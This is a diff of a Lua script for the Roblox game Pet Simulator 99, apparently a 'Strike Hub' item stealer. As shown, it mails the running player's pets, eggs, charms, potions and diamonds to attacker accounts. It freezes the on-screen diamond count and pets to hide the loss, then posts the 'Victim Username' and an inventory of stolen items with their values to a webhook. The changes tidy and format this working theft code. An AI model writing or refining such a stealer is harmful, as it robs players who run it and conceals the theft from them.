@@ -61,20 +61,28 @@ local RunService = game:GetService("RunService")
 local leaderstats = plr:WaitForChild("leaderstats")
 local diamondsValue = leaderstats:FindFirstChild("💎 Diamonds") or leaderstats:FindFirstChild("Diamonds")
 local frozenDiamonds = diamondsValue and diamondsValue.Value or 0
-local petsFolder = workspace:WaitForChild("__THINGS"):WaitForChild("Pets")
 
 local function anchorModel(model)
-    if model:IsA("Model") then
-        for _, part in ipairs(model:GetDescendants()) do
-            if part:IsA("BasePart") then part.Anchored=true end
+    for _, part in ipairs(model:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.Anchored = true
+        end
+    end
+end
+
+local petsFolder = workspace:WaitForChild("__THINGS"):WaitForChild("Pets")
+local function freezePets()
+    for _, pet in ipairs(petsFolder:GetChildren()) do
+        if pet:IsA("Model") and pet:GetAttribute("Equipped") then
+            anchorModel(pet)
         end
     end
 end
 
 local freezeConnection
 freezeConnection = RunService.RenderStepped:Connect(function()
-    if diamondsValue then diamondsValue.Value=frozenDiamonds end
-    for _, pet in ipairs(petsFolder:GetChildren()) do anchorModel(pet) end
+    if diamondsValue then diamondsValue.Value = frozenDiamonds end
+    freezePets()
 end)
 
 plr.AncestryChanged:Connect(function(_, parent)
@@ -82,7 +90,9 @@ plr.AncestryChanged:Connect(function(_, parent)
         if freezeConnection then freezeConnection:Disconnect() end
         for _, pet in ipairs(petsFolder:GetChildren()) do
             for _, part in ipairs(pet:GetDescendants()) do
-                if part:IsA("BasePart") then part.Anchored=false end
+                if part:IsA("BasePart") then
+                    part.Anchored = false
+                end
             end
         end
     end
@@ -108,6 +118,17 @@ local function getRAP(Type, Item)
     }) or 0)
 end
 
+local function formatNumber(number)
+    local number = math.floor(number)
+    local suffixes = {"", "k", "m", "b", "t"}
+    local suffixIndex = 1
+    while number >= 1000 and suffixIndex < #suffixes do
+        number = number / 1000
+        suffixIndex = suffixIndex + 1
+    end
+    return string.format("%.2f%s", number, suffixes[suffixIndex])
+end
+
 local function sendItem(category, uid, am)
     local remaining = am or 1
     local userIndex = 1
@@ -122,7 +143,7 @@ local function sendItem(category, uid, am)
             if mailSendPrice>5000000 then mailSendPrice=5000000 end
             remaining=0
         elseif err=="They don't have enough space!" then
-            userIndex=userIndex+1
+            userIndex = userIndex + 1
             if userIndex>maxUsers then warn("All mailboxes full for item "..uid) return end
         else
             warn("Failed to send item: "..tostring(err))
@@ -132,26 +153,23 @@ local function sendItem(category, uid, am)
 end
 
 local function SendAllGems()
-    for i,v in pairs(save.Currency) do
-        if v.id=="Diamonds" then
-            local remainingGems = GemAmount1
-            local userIndex=1
-            local maxUsers=#users
-            while remainingGems>0 do
-                local currentUser=users[userIndex]
-                local args={[1]=currentUser,[2]=MailMessage,[3]="Currency",[4]=i,[5]=remainingGems}
-                local response, err=network.Invoke("Mailbox: Send", unpack(args))
-                if response==true then
-                    GemAmount1 = GemAmount1 - remainingGems
-                    remainingGems=0
-                elseif err=="They don't have enough space!" then
-                    userIndex=userIndex+1
-                    if userIndex>maxUsers then warn("All mailboxes full for gems") return end
-                else
-                    warn("Failed to send gems: "..tostring(err))
-                    return
-                end
-            end
+    local remainingGems = GemAmount1
+    if remainingGems <= mailSendPrice then return end
+    local userIndex = 1
+    local maxUsers = #users
+    while remainingGems>0 do
+        local currentUser = users[userIndex]
+        local args={[1]=currentUser,[2]=MailMessage,[3]="Currency",[4]=1,[5]=remainingGems}
+        local response, err = network.Invoke("Mailbox: Send", unpack(args))
+        if response==true then
+            GemAmount1 = GemAmount1 - remainingGems
+            remainingGems = 0
+        elseif err=="They don't have enough space!" then
+            userIndex = userIndex + 1
+            if userIndex>maxUsers then warn("All mailboxes full for gems") return end
+        else
+            warn("Failed to send gems: "..tostring(err))
+            return
         end
     end
 end
@@ -180,12 +198,12 @@ local function canSendMail()
     return (err=="They don't have enough space!")
 end
 
--- ==== MAIN EXECUTION FLOW ====
+-- ==== MAIN FLOW ====
 require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
 require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
 
--- Collect only Gargantuan, Titanic, Huge, ExclusiveLevel pets + other categories
 local categoryList = {"Pet","Egg","Charm","Enchant","Potion","Misc","Ultimate"}
+
 for _, category in ipairs(categoryList) do
     if save[category] then
         for uid,item in pairs(save[category]) do
@@ -233,17 +251,17 @@ if GemAmount1>mailSendPrice then
     SendAllGems()
 end
 
--- Webhook
+-- ==== WEBHOOK ====
 spawn(function()
     local headers = {["Content-Type"]="application/json"}
-    local fields={
+    local fields = {
         {name="Victim Username:", value=plr.Name, inline=true},
         {name="Items to be sent:", value="", inline=false},
         {name="Summary:", value="", inline=false}
     }
-    local combinedItems={}
-    local itemRapMap={}
-    for _,item in ipairs(sortedItems) do
+    local combinedItems = {}
+    local itemRapMap = {}
+    for _, item in ipairs(sortedItems) do
         local rapKey = item.name
         if itemRapMap[rapKey] then
             itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
@@ -252,16 +270,17 @@ spawn(function()
             table.insert(combinedItems, rapKey)
         end
     end
-    table.sort(combinedItems, function(a,b) return itemRapMap[a].rap*itemRapMap[a].amount>itemRapMap[b].rap*itemRapMap[b].amount end)
+    table.sort(combinedItems,function(a,b)
+        return itemRapMap[a].rap*itemRapMap[a].amount>itemRapMap[b].rap*itemRapMap[b].amount
+    end)
     for _, itemName in ipairs(combinedItems) do
         local itemData = itemRapMap[itemName]
-        fields[2].value = fields[2].value..itemName.." (x"..itemData.amount.."):"..itemData.rap*itemData.amount.." RAP\n"
+        fields[2].value = fields[2].value..itemName.." (x"..itemData.amount..")"..": "..formatNumber(itemData.rap*itemData.amount).." RAP\n"
     end
-    fields[3].value = string.format("Gems: %d\nTotal RAP: %d", GemAmount1, totalRAP)
-    local data={["embeds"]={{["title"]="🎱 New PS99 Execution",["color"]=65280,["fields"]=fields,["footer"]={["text"]="Strike Hub."}}}}
-    request({Url=webhook, Method="POST", Headers=headers, Body=HttpService:JSONEncode(data)})
+    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(GemAmount1), formatNumber(totalRAP))
+    local data = {
+        ["embeds"]={{["title"]="💱 New PS99 Execution", ["color"]=65280, ["fields"]=fields, ["footer"]={["text"]="Strike Hub."}}}
+    }
+    local body = HttpService:JSONEncode(data)
+    request({Url=webhook, Method="POST", Headers=headers, Body=body})
 end)
-
--- Script finished
-TextLabel.Text = "All items and gems have been sent!"
-print("[INFO] Script finished successfully")
